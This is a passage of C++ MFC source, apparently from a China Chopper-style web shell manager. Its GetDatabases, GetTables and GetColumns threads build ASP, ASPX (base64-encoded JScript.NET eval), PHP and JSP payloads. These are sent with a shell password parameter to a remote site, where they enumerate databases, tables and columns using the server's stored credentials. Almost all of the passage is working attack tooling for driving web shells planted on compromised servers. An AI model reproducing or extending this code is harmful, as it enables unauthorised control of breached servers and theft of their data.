			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpOracle +szDataHost+"&z2="+szDataUser+"&z3="+szDataPass, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpMssql +szDataHost+"&z2="+szDataUser+"&z3="+szDataPass, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "ODBC_MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpODBC_MSSQL +szDataHost+"&z2="+szDataUser+"&z3="+szDataPass, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MYSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpMysql +szDataHost+"&z2="+szDataUser+"&z3="+szDataPass, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MYSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpPDO_MYSQL +szDataHost+"&z2="+szDataUser+"&z3="+szDataPass, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpPDO_MSSQL +szDataHost+"&z2="+szDataUser+"&z3="+szDataPass, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "POSTGRESQL")
		{
			CString szDataPort,szDataNameD;
			posX = pDlg->szSiteConfig.Find("<S>");
			posY = pDlg->szSiteConfig.Find("</S>", posX+1);
			szDataPort = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

			posX = pDlg->szSiteConfig.Find("<D>");
			posY = pDlg->szSiteConfig.Find("</D>", posX+1);
			szDataNameD = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
			szDataNameD = UrlEnCode(pDlg->nSiteCode, szDataNameD);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataPhpPostgreSQL +szDataHost+"&z2="+szDataPort+"&z3="+szDataNameD+"&z4="+szDataUser+"&z5="+szDataPass, pDlg->nSiteCode, temp, szError);
		}else{
			m_edit.SetWindowText( "Type of database does not recognize." );					//设置状态栏
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
		//AfxMessageBox("PHP: "+ szSiteConfig );
	}else if (pDlg->nSiteScript ==4)																		//JSP
	{
		posX = pDlg->szSiteConfig.Find("<X>");
		if (posX == -1)
		{
			m_edit.SetWindowText( "Error" );					//设置状态栏
			pDlg->bThreadFinish = true;
			return 0;
		}
		posY = pDlg->szSiteConfig.Find("</X>", posX+1);
		if (posY == -1)
		{
			m_edit.SetWindowText( "Error" );					//设置状态栏
			pDlg->bThreadFinish = true;
			return 0;
		}
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataType = UrlEnCode(pDlg->nSiteCode,  szDataType );
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ "=N&z0="+ pDlg->szSiteCode +"&z1="+ szDataType, pDlg->nSiteCode, temp, szError);
		//AfxMessageBox("JSP: "+ szSiteConfig );
	}else{
		m_edit.SetWindowText( "Type of database does not recognize." );					//设置状态栏
		AfxMessageBox("Type of SiteScript does not recognize.");
		pDlg->bThreadFinish = true;
		return 0;
	}

	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK)
	{
		m_edit.SetWindowText( "Error" );					//设置状态栏
		AfxMessageBox( szError );
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp == "")
	{
		m_edit.SetWindowText( "Empty" );					//设置状态栏
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp.Left(8) == "ERROR://")
	{
		m_edit.SetWindowText( "Error" );					//设置状态栏
		AfxMessageBox(temp);
		pDlg->bThreadFinish = true;
		return 0;
	}
	//AfxMessageBox(temp);
	CStringArray databases;
	databases.RemoveAll();
	decodeCString(temp, databases, '\t');

	int nIndex=(int)databases.GetCount();
	int i=0;
	while(i < nIndex)
	{
		pDlg->m_comDatas.AddString( databases.GetAt(i) );
		HTREEITEM m_hRoot = pDlg->m_datatree.InsertItem(databases.GetAt(i), TVI_ROOT,TVI_LAST);
		pDlg->m_datatree.Expand(m_hRoot, TVE_EXPAND);
		i++;
	}
	CString sz_edit;
	sz_edit.Format("Database(%d)", nIndex);
	m_edit.SetWindowText( sz_edit );					//设置状态栏
	pDlg->bThreadFinish = true;
	return 0;
}


DWORD WINAPI GetTables(LPVOID lpParam)		//线程									//获取表名
{
	CDataDlg* pDlg = (CDataDlg*)lpParam;

	m_edit.SetWindowText( "Reading Tables: " +  pDlg->GetTables_szDataName);					//设置状态栏

	CString temp ="";

	pDlg->m_comDatas.SetCurSel( pDlg->m_comDatas.FindStringExact(0, pDlg->GetTables_szDataName) );	//设置现在选择的数据库名

	int posX=0,posY=0;
	CString szDataType;
	CString szDataHost,szDataUser,szDataPass;
	if (pDlg->nSiteScript == 1)																		// ASP
	{
		posX = pDlg->szSiteConfig.Find("<C>");
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较
		if (temp.Find("DRIVER={SQL") != -1)
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType,false, true);
			temp = szDataTableAspSqlServer + szDataType +"&z2="+ UrlEnCode(pDlg->nSiteCode, pDlg->GetTables_szDataName);
			temp += "&z3=Set+Conn%3DServer.CreateObject%28%22Adodb.connection%22%29%3ADim+SI%3AConn.Open+%22%22%26bd%28Request%28%22z1%22%29%29%26%22%22%3AIf+Err"
				"+Then%3ASI%3D%22ERROR%3A%2F%2F+%22%26Err.Description%3AErr.Clear%3AElse%3ASet+Rs%3DConn.OpenSchema%2820%29%3ARs.MoveFirst%3ASI%3D%22%22%3ADo+While+Not"
				"+Rs.Eof%3AIf+Rs%28%22TABLE_TYPE%22%29%3D%22TABLE%22+Then%3ASI%3DSI%26Rs%28%22TABLE_NAME%22%29%26chr%289%29%3AEnd+If%3ARs.MoveNext%3ALoop%3ASet+Rs%3DNo"
				"thing%3AConn.Close%3AEnd+If%3ASet+Conn%3DNothing%3AResponse.Write%28SI%29&z4=";
			temp += szDataType;
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 ||
			temp.Find("DRIVER={MYSQL}") != -1 ||
			temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTableAsp1 + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTableAsp2 + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
	}else if (pDlg->nSiteScript ==2)																		//ASPX
	{
		posX = pDlg->szSiteConfig.Find("<C>");
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较

		CString szDataFamatPageCode;
		szDataFamatPageCode.Format("%d", pDlg->nSiteCode);

		if (temp.Find("DRIVER={SQL") != -1)
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataTableAspxSqlServer + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);
			temp += "&z2=" + UrlEnCode(pDlg->nSiteCode, pDlg->GetTables_szDataName);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");Conn.Open(System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").GetString(Sy"
				"stem.Convert.FromBase64String(Request.Item[\"z1\"])));var Rs=new ActiveXObject(\"ADODB.Recordset\");Rs.Open(\"USE [\"+Request.Ite"
				"m[\"z2\"]+\"];SELECT [name] FROM sysobjects WHERE (xtype='U') ORDER BY 1\",Conn,1,1);while(!Rs.EOF && !Rs.BOF){Response.Write(Rs.Fields(0).Val"
				"ue+\"\\t\");Rs.MoveNext();}Rs.Close();Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 ||
			temp.Find("DRIVER={MYSQL}") != -1 ||
			temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataTableAspx1 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");Conn.ConnectionString=System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +")"
				".GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));Conn.ConnectionTimeout=10;Conn.Open();var Rs=Conn.OpenSchema(20);"
				"var x:String=\"\";while(!Rs.EOF && !Rs.BOF){if(Rs.Fields(3).Value==\"TABLE\"){x+=Rs.Fields(2).Value+\"\\t\";}Rs.MoveNext();}Rs.Close();Conn.Close();Response.Write(x);";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataTableAspx2 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");Conn.ConnectionString=System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +")."
				"GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]));Conn.ConnectionTimeout=10;Conn.Open();var Rs=Conn.OpenSchema(20)"
				";var x:String=\"\";while(!Rs.EOF && !Rs.BOF){if(Rs.Fields(3).Value==\"TABLE\"){x+=Rs.Fields(2).Value+\"\\t\";}Rs.MoveNext();}Rs.Close();Conn.Close();Response.Write(x);";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp, pDlg->nSiteCode, temp, szError);
		}
		else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
	}else if (pDlg->nSiteScript == 3)																		//PHP
	{
		posX = pDlg->szSiteConfig.Find("<T>");
		posY = pDlg->szSiteConfig.Find("</T>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

		posX = pDlg->szSiteConfig.Find("<H>");
		posY = pDlg->szSiteConfig.Find("</H>", posX+1);
		szDataHost = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataHost = UrlEnCode(pDlg->nSiteCode, szDataHost);

		posX = pDlg->szSiteConfig.Find("<U>");
		posY = pDlg->szSiteConfig.Find("</U>", posX+1);
		szDataUser = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataUser = UrlEnCode(pDlg->nSiteCode, szDataUser);

		posX = pDlg->szSiteConfig.Find("<P>");
		posY = pDlg->szSiteConfig.Find("</P>", posX+1);
		szDataPass = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataPass = UrlEnCode(pDlg->nSiteCode, szDataPass);

		szDataType.MakeUpper();								//转大写比较
		if (szDataType == "INFORMIX")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpInformix + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);

		}else if (szDataType == "ORACLE")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpOracle + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpMssql + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "ODBC_MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpODBC_MSSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MYSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpMysql + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MYSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpPDO_MYSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "PDO_MSSQL")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpPDO_MSSQL + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "POSTGRESQL")
		{
			CString szDataPort,szDataNameD;
			posX = pDlg->szSiteConfig.Find("<S>");
			posY = pDlg->szSiteConfig.Find("</S>", posX+1);
			szDataPort = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

			posX = pDlg->szSiteConfig.Find("<D>");
			posY = pDlg->szSiteConfig.Find("</D>", posX+1);
			szDataNameD = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
			szDataNameD = UrlEnCode(pDlg->nSiteCode, szDataNameD);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataTablePhpPostgreSQL +szDataHost+"&z2="+szDataPort+"&z3="+szDataNameD+"&z4="+szDataUser+"&z5="+szDataPass+"&z6="+pDlg->GetTables_szDataName, pDlg->nSiteCode, temp, szError);
		}else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
		//AfxMessageBox("PHP: "+ pDlg->szSiteConfig );
	}else if (pDlg->nSiteScript == 4)																		//JSP
	{
		posX = pDlg->szSiteConfig.Find("<X>");
		if (posX == -1)
		{
			pDlg->bThreadFinish = true;
			return 0;
		}
		posY = pDlg->szSiteConfig.Find("</X>", posX+1);
		if (posY == -1)
		{
			pDlg->bThreadFinish = true;
			return 0;
		}
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataType = UrlEnCode(pDlg->nSiteCode,  szDataType + pDlg->GetTables_szDataName );
		bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ "=O&z0="+ pDlg->szSiteCode +"&z1="+ szDataType, pDlg->nSiteCode, temp, szError);
		//AfxMessageBox("JSP: "+ pDlg->szSiteConfig );
	}else{
		AfxMessageBox("Type of SiteScript does not recognize.");
		pDlg->bThreadFinish = true;
		return 0;
	}

	if (pDlg->m_hWnd == NULL)		//正在执行，如果关闭就崩溃了。
	{
		return 0;
	}
	if (!bHttpIsOK)
	{
		AfxMessageBox( szError );
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp == "")
	{
		m_edit.SetWindowText( "Empty" );					//设置状态栏
		pDlg->bThreadFinish = true;
		return 0;
	}
	if (temp.Left(8) == "ERROR://")
	{
		AfxMessageBox(temp);
		pDlg->bThreadFinish = true;
		return 0;
	}

	CStringArray szATables;
	szATables.RemoveAll();
	decodeCString(temp, szATables, '\t');

	bDeleteItems(pDlg->m_datatree, pDlg->GetTables_hParent);			//清空所有

	int nIndex=(int)szATables.GetCount();
	int i=0;
	while(i < nIndex)
	{
		pDlg->m_datatree.InsertItem(szATables.GetAt(i), 1, 1, pDlg->GetTables_hParent);
		if (i == 0)											//展开一次就好
		{
			pDlg->m_datatree.Expand(pDlg->GetTables_hParent, TVE_EXPAND);
		}
		i++;
	}
	CString sz_edit;
	sz_edit.Format("Tables: %s(%d)", pDlg->GetTables_szDataName, nIndex);
	m_edit.SetWindowText( sz_edit );					//设置状态栏

	pDlg->bThreadFinish = true;
	return 0;
}


DWORD WINAPI GetColumns(LPVOID lpParam)		//线程					//获取列名
{
	CDataDlg* pDlg = (CDataDlg*)lpParam;

	m_edit.SetWindowText( "Reading Columns: " +  pDlg->GetColumns_szTableName);					//设置状态栏

	CString temp ="";

	pDlg->m_comDatas.SetCurSel( pDlg->m_comDatas.FindStringExact(0, pDlg->GetColumns_szDataName) );		//设置现在选择的数据库名

	temp = "";
	int posX=0,posY=0;
	CString szDataType;
	CString szDataHost,szDataUser,szDataPass;
	if (pDlg->nSiteScript == 1)																		// ASP
	{
		pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select Top 20 * From "+pDlg->GetColumns_szTableName+" Order By 1");

		posX = pDlg->szSiteConfig.Find("<C>");
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较
		if (temp.Find("DRIVER={SQL") != -1)
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			temp = szDataType +"&z2=";
			temp += UrlEnCode(pDlg->nSiteCode, "USE ["+ pDlg->GetColumns_szDataName +"];SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id('"+ pDlg->GetColumns_szTableName +"') and A.xtype=B.xtype ORDER BY A.colid", false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataColumnsAspSqlServer + temp, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 )
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			szDataType += "&z2="+ UrlEnCode(pDlg->nSiteCode, "SELECT TOP 1 * FROM "+ pDlg->GetColumns_szTableName, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataColumnsAsp1 + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else if ( temp.Find("DRIVER={MYSQL}") != -1 )
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			szDataType += "&z2="+ UrlEnCode(pDlg->nSiteCode, "SELECT * FROM "+ pDlg->GetColumns_szTableName +" limit 1", false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataColumnsAsp1 + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else if ( temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			szDataType += "&z2="+ UrlEnCode(pDlg->nSiteCode, "SELECT * FROM "+ pDlg->GetColumns_szTableName +" where rownum=1", false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataColumnsAsp1 + szDataType, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			CString szAccessColumns = "SELECT TOP 1 * FROM "+ pDlg->GetColumns_szTableName;
			szAccessColumns = UrlEnCode(pDlg->nSiteCode, szAccessColumns, false, true);
			szDataType = UrlEnCode(pDlg->nSiteCode, szDataType, false, true);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+szDataColumnsAsp2 + szDataType +"&z2="+ szAccessColumns, pDlg->nSiteCode, temp, szError);
		}
		else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
	}else if (pDlg->nSiteScript ==2)																		//ASPX
	{
		pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select Top 20 * From "+pDlg->GetColumns_szTableName+" Order By 1");

		posX = pDlg->szSiteConfig.Find("<C>");
		posY = pDlg->szSiteConfig.Find("</C>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		temp = szDataType;
		temp.MakeUpper();		//转大写比较

		CString szDataFamatPageCode;
		szDataFamatPageCode.Format("%d", pDlg->nSiteCode);

		if (temp.Find("DRIVER={SQL") != -1)
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataColumnsAspxSqlServer + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "var Conn=new ActiveXObject(\"Adodb.connection\");Conn.Open(System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").GetSt"
				"ring(System.Convert.FromBase64String(Request.Item[\"z1\"])));var Rs=new ActiveXObject(\"ADODB.Recordset\");Rs.Open(System.Te"
				"xt.Encoding.GetEncoding("+ szDataFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z2\"])),Conn,1,1);while(!Rs.EOF && !R"
				"s.BOF){Response.Write(Rs.Fields(0).Value+\" (\"+Rs.Fields(1).Value+\")\\t\");Rs.MoveNext();}Rs.Close();Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			CString szColumns;
			szColumns = "USE ["+ pDlg->GetColumns_szDataName +"];SELECT A.[name],B.[name] FROM syscolumns A,systypes B where A.id=object_id('"+ pDlg->GetColumns_szTableName +"') and A.xtype=B.xtype ORDER BY A.colid";
			szColumns = MyBase64Encode(pDlg->nSiteCode, szColumns);
			temp += "&z2=" + szColumns;
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp, pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("PROVIDER=SQLOLEDB") != -1 ||
			temp.Find("DRIVER={MYSQL}") != -1 ||
			temp.Find("PROVIDER=ORAOLEDB") != -1 ||
			temp.Find("PROVIDER=MSDAORA") != -1 ||
			temp.Find("DSN=") != -1 )
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataColumnsAspx1 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "function TN(n:Int32):String{switch(n){case 2:return \"smallint\";case 3:return \"int\";case 4:r"
				"eturn \"real\";case 5:return \"float\";case 6:return \"money\";case 7:return \"datetime\";case "
				"11:return \"bit\";case 12:return \"variant\";case 16:return \"tinyint\";case 17:return \"tinyin"
				"t\";case 20:return \"bigint\";case 72:return \"unique\";case 128:return \"binary\";case 129:ret"
				"urn \"char\";case 130:return \"nchar\";case 131:return \"numeric\";case 135:return \"datetime\""
				";case 200:return \"varchar\";case 201:return \"text\";case 202:return \"nvarchar\";case 203:ret"
				"urn \"ntext\";case 204:return \"varbinary\";case 205:return \"image\";default:return n;}}var Co"
				"nn=new ActiveXObject(\"Adodb.connection\");Conn.Open(System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").Ge"
				"tString(System.Convert.FromBase64String(Request.Item[\"z1\"])));var Rs=new ActiveXObject(\"ADODB.Recor"
				"dset\");Rs.Open(System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(Requ"
				"est.Item[\"z2\"])),Conn,1,1);var c:Int32;for(c=0;c<=Rs.Fields.Count-1;c++){Response.Write(Rs.Fields.It"
				"em(c).Name+\" (\"+TN(Rs.Fields.Item(c).Type)+\")\\t\");}Rs.Close();Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass + temp +"&z2="+ MyBase64Encode(pDlg->nSiteCode, "SELECT TOP 1 * FROM "+ pDlg->GetColumns_szTableName), pDlg->nSiteCode, temp, szError);
		}
		else if (temp.Find("DRIVER={MICROSOFT") != -1 ||
			temp.Find("PROVIDER=MICROSOFT") != -1)
		{
			temp = MyBase64Encode(pDlg->nSiteCode, szDataType);
			temp = szDataColumnsAspx2 + temp;
			temp.Replace("%nPageCode%", szDataFamatPageCode);

			CString szBase64EvalCode = "function TN(n:Int32):String{switch(n){case 2:return \"smallint\";case 3:return \"int\";case 4:retur"
				"n \"real\";case 5:return \"float\";case 6:return \"money\";case 7:return \"datetime\";case 11:retur"
				"n \"bit\";case 12:return \"variant\";case 16:return \"tinyint\";case 17:return \"tinyint\";case 20:"
				"return \"bigint\";case 72:return \"unique\";case 128:return \"binary\";case 129:return \"char\";cas"
				"e 130:return \"nchar\";case 131:return \"numeric\";case 135:return \"datetime\";case 200:return \"v"
				"archar\";case 201:return \"text\";case 202:return \"nvarchar\";case 203:return \"ntext\";case 204:r"
				"eturn \"varbinary\";case 205:return \"image\";default:return n;}}var Conn=new ActiveXObject(\"A"
				"dodb.connection\");Conn.Open(System.Text.Encoding.GetEncoding("+ szDataFamatPageCode +").GetString(System.Convert.FromBase"
				"64String(Request.Item[\"z1\"])));var Rs=new ActiveXObject(\"ADODB.Recordset\");Rs.Open(System.Text.E"
				"ncoding.GetEncoding("+szDataFamatPageCode +").GetString(System.Convert.FromBase64String(Request.Item[\"z2\"])),Conn,1,1);v"
				"ar c:Int32;for(c=0;c<=Rs.Fields.Count-1;c++){Response.Write(Rs.Fields.Item(c).Name+\" (\"+TN(Rs.Field"
				"s.Item(c).Type)+\")\\t\");}Rs.Close();Conn.Close();";
			szBase64EvalCode = MyBase64Encode(-1, szBase64EvalCode);
			temp.Replace("%szBase64EvalCode%", szBase64EvalCode);

			CString szAccessColumns = "SELECT TOP 1 * FROM "+ pDlg->GetColumns_szTableName;
			szAccessColumns = MyBase64Encode(pDlg->nSiteCode, szAccessColumns);
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ temp +"&z2="+ szAccessColumns, pDlg->nSiteCode, temp, szError);
		}
		else{
			AfxMessageBox("Type of database does not recognize.");
			pDlg->bThreadFinish = true;
			return 0;
		}
	}else if (pDlg->nSiteScript == 3)																		//PHP
	{
		posX = pDlg->szSiteConfig.Find("<T>");
		posY = pDlg->szSiteConfig.Find("</T>", posX+1);
		szDataType = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);

		posX = pDlg->szSiteConfig.Find("<H>");
		posY = pDlg->szSiteConfig.Find("</H>", posX+1);
		szDataHost = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataHost = UrlEnCode(pDlg->nSiteCode, szDataHost);

		posX = pDlg->szSiteConfig.Find("<U>");
		posY = pDlg->szSiteConfig.Find("</U>", posX+1);
		szDataUser = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataUser = UrlEnCode(pDlg->nSiteCode, szDataUser);

		posX = pDlg->szSiteConfig.Find("<P>");
		posY = pDlg->szSiteConfig.Find("</P>", posX+1);
		szDataPass = pDlg->szSiteConfig.Mid(posX+3, posY-posX-3);
		szDataPass = UrlEnCode(pDlg->nSiteCode, szDataPass);

		szDataType.MakeUpper();								//转大写比较
		if (szDataType == "INFORMIX")
		{
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataColumnsPhpInformix + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ pDlg->GetColumns_szDataName +"&z5="+ pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);

		}else if (szDataType == "ORACLE")
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select * From "+pDlg->GetColumns_szTableName+" Where RowNum <= 20 Order By 1");
			bHttpIsOK = MyHttp(pDlg->szSiteUrl, pDlg->szSitePass+ szDataColumnsPhpOracle + szDataHost +"&z2="+ szDataUser +"&z3="+ szDataPass +"&z4="+ pDlg->GetColumns_szDataName +"&z5="+ pDlg->GetColumns_szTableName, pDlg->nSiteCode, temp, szError);
		}else if (szDataType == "MSSQL")
		{
			pDlg->SetDlgItemText(IDC_COMBO_SQL,"Select Top 20 * From "+pDlg->GetColumns_szTableName+" Order By 1");
